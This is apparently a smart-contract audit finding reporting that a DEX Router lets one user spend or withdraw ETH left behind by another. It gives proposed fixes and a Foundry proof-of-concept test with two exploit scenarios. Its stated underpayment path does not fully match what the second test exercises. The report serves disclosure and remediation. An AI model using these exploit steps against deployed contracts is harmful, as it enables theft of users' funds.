## Title
Router Multihop Swap ETH Payment Source Mismatch Allows Theft of User Funds

## Summary
The Router's `handleLockData` function uses the contract's ETH balance to pay the FlashAccountant when native token payment is required in multihop swaps, without validating that `msg.value` covers the payment amount. This allows attackers to exploit excess ETH left in the Router by previous users, effectively receiving tokens while paying zero or insufficient ETH. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Router.sol`, function `handleLockData`, lines 238-242 (and also line 230)

**Intended Logic:** When a multihop swap requires native ETH payment (totalCalculated < 0 and calculatedToken is NATIVE_TOKEN_ADDRESS), the user should pay the required ETH amount via `msg.value`, which the Router then forwards to the FlashAccountant.

**Actual Logic:** The Router unconditionally uses `SafeTransferLib.safeTransferETH` to send ETH from its own balance to the accountant, without verifying that `msg.value` equals the required payment. If the Router has accumulated ETH from previous users who sent excess `msg.value`, attackers can exploit this by sending zero or insufficient `msg.value` for their own swaps. [2](#0-1) 

**Exploitation Path:**

1. **Victim Setup**: User Alice calls `multihopSwap` with a route requiring 1 ETH payment (totalSpecified = +1 ETH, specifiedToken = NATIVE_TOKEN_ADDRESS). Alice accidentally sends 2 ETH as `msg.value`.
   - Line 230 executes: `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), 1 ETH)` 
   - 1 ETH remains stuck in the Router contract

2. **Attacker Exploit**: User Bob calls `multihopSwap` with a route requiring 1 ETH payment (totalCalculated = -1 ETH, calculatedToken = NATIVE_TOKEN_ADDRESS). Bob sends 0 ETH as `msg.value`.
   - Line 240 executes: `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), 1 ETH)`
   - The Router uses Alice's leftover 1 ETH to pay for Bob's swap
   - Bob receives output tokens from the swap

3. **Alternative Direct Theft**: Any user can call the public `refundNativeToken()` function to drain all ETH from the Router [3](#0-2) 

4. **Result**: Bob receives tokens worth 1 ETH while paying 0 ETH (effectively receiving free ETH usage). Alice loses her 1 ETH.

**Security Property Broken:** Direct theft of user funds - Alice's excess ETH is stolen by Bob or any front-running attacker calling `refundNativeToken()`.

## Impact Explanation
- **Affected Assets**: Native ETH sent to the Router contract
- **Damage Severity**: Complete loss of excess ETH sent by users. Any user who accidentally sends more `msg.value` than required loses the excess to either: (1) subsequent swap attackers who underpay, or (2) MEV bots front-running with `refundNativeToken()` calls
- **User Impact**: Any user performing multihop swaps with native tokens is at risk. This affects both casual users (who may not calculate exact `msg.value`) and integrators (who may send conservative amounts to avoid reversion)

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this. MEV bots can monitor the mempool for transactions leaving ETH in the Router and immediately front-run with `refundNativeToken()` calls.
- **Preconditions**: 
  - Router contract has ETH balance > 0 (from any previous user who sent excess `msg.value`)
  - No other preconditions required
- **Execution Complexity**: Single transaction - attacker simply calls `multihopSwap` with insufficient `msg.value`, or directly calls `refundNativeToken()`
- **Frequency**: Continuously exploitable. Every excess ETH deposit creates an opportunity for theft.

## Recommendation

**Fix 1: Validate msg.value matches required payment**

In `src/Router.sol`, function `handleLockData`, add validation after calculating `totalSpecified` and `totalCalculated`: [2](#0-1) 

```solidity
// After line 224, before line 226:
uint256 requiredEthPayment = 0;
if (totalSpecified > 0 && specifiedToken == NATIVE_TOKEN_ADDRESS) {
    requiredEthPayment += uint256(totalSpecified);
}
if (totalCalculated < 0 && calculatedToken == NATIVE_TOKEN_ADDRESS) {
    requiredEthPayment += uint256(-totalCalculated);
}
if (msg.value != requiredEthPayment) {
    revert IncorrectEthAmount(requiredEthPayment, msg.value);
}
```

**Fix 2: Make refundNativeToken restricted**

Either remove `refundNativeToken()` entirely (forcing exact `msg.value`), or track per-user balances to prevent theft: [3](#0-2) 

```solidity
// Track user deposits
mapping(address => uint256) private ethBalances;

// Update refundNativeToken to only refund caller's balance
function refundNativeToken() external payable {
    uint256 refundAmount = ethBalances[msg.sender];
    if (refundAmount != 0) {
        ethBalances[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}
```

**Recommended approach**: Implement Fix 1 with strict `msg.value` validation and remove `refundNativeToken()` to prevent any ETH accumulation in the Router.

## Proof of Concept

```solidity
// File: test/Exploit_RouterEthTheft.t.sol
// Run with: forge test --match-test test_RouterEthTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "./FullTest.sol";

contract Exploit_RouterEthTheft is FullTest {
    
    function test_RouterEthTheft() public {
        // SETUP: Create a pool with native token
        PoolKey memory poolKey = createPool({
            token0: NATIVE_TOKEN_ADDRESS, 
            token1: address(token1),
            tick: 0,
            fee: 1 << 63,
            tickSpacing: 100
        });
        
        // Add liquidity to the pool
        createPosition(poolKey, -100, 100, 1 ether, 1000e18);
        
        // VICTIM: Alice performs a multihop swap and accidentally sends 2 ETH instead of 1 ETH
        vm.deal(alice, 10 ether);
        vm.startPrank(alice);
        
        RouteNode[] memory route = new RouteNode[](1);
        route[0] = RouteNode(poolKey, SqrtRatio.wrap(0), 0);
        
        // Alice swaps 1 ETH for tokens but sends 2 ETH
        router.multihopSwap{value: 2 ether}(
            Swap(route, TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 1 ether})),
            type(int256).min
        );
        vm.stopPrank();
        
        // Verify 1 ETH is stuck in router
        assertEq(address(router).balance, 1 ether, "1 ETH should be stuck in router");
        
        // EXPLOIT: Bob calls refundNativeToken to steal Alice's ETH
        vm.deal(bob, 0);
        assertEq(bob.balance, 0, "Bob starts with 0 ETH");
        
        vm.prank(bob);
        router.refundNativeToken();
        
        // VERIFY: Bob stole Alice's 1 ETH
        assertEq(bob.balance, 1 ether, "Bob stole 1 ETH from Alice");
        assertEq(address(router).balance, 0, "Router balance drained");
    }
    
    function test_RouterEthTheft_ViaUnderpayment() public {
        // SETUP: Create a pool with native token
        PoolKey memory poolKey = createPool({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: address(token1), 
            tick: 0,
            fee: 1 << 63,
            tickSpacing: 100
        });
        
        createPosition(poolKey, -100, 100, 10 ether, 10000e18);
        
        // VICTIM: Alice sends excess ETH
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        RouteNode[] memory route1 = new RouteNode[](1);
        route1[0] = RouteNode(poolKey, SqrtRatio.wrap(0), 0);
        router.multihopSwap{value: 2 ether}(
            Swap(route1, TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 1 ether})),
            type(int256).min
        );
        
        // Verify router has 1 ETH stuck
        assertEq(address(router).balance, 1 ether);
        
        // EXPLOIT: Bob does swap requiring 1 ETH but sends 0 ETH
        vm.deal(bob, 0);
        uint256 bobTokenBalanceBefore = token1.balanceOf(bob);
        
        vm.prank(bob);
        RouteNode[] memory route2 = new RouteNode[](1);
        route2[0] = RouteNode(poolKey, SqrtRatio.wrap(0), 0);
        
        // Bob sends 0 ETH but router uses Alice's stuck ETH
        router.multihopSwap{value: 0}(
            Swap(route2, TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 1 ether})),
            type(int256).min
        );
        
        // VERIFY: Bob received tokens without paying ETH
        uint256 bobTokenBalanceAfter = token1.balanceOf(bob);
        assertGt(bobTokenBalanceAfter, bobTokenBalanceBefore, "Bob received tokens");
        assertEq(address(router).balance, 0, "Alice's ETH was used");
    }
}
```

### Citations

**File:** src/Router.sol (L226-244)
```text
                if (totalSpecified < 0) {
                    ACCOUNTANT.withdraw(specifiedToken, swapper, uint128(uint256(-totalSpecified)));
                } else if (totalSpecified > 0) {
                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
                    } else {
                        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
                    }
                }

                if (totalCalculated > 0) {
                    ACCOUNTANT.withdraw(calculatedToken, swapper, uint128(uint256(totalCalculated)));
                } else if (totalCalculated < 0) {
                    if (calculatedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-totalCalculated)));
                    } else {
                        ACCOUNTANT.payFrom(swapper, calculatedToken, uint128(uint256(-totalCalculated)));
                    }
                }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
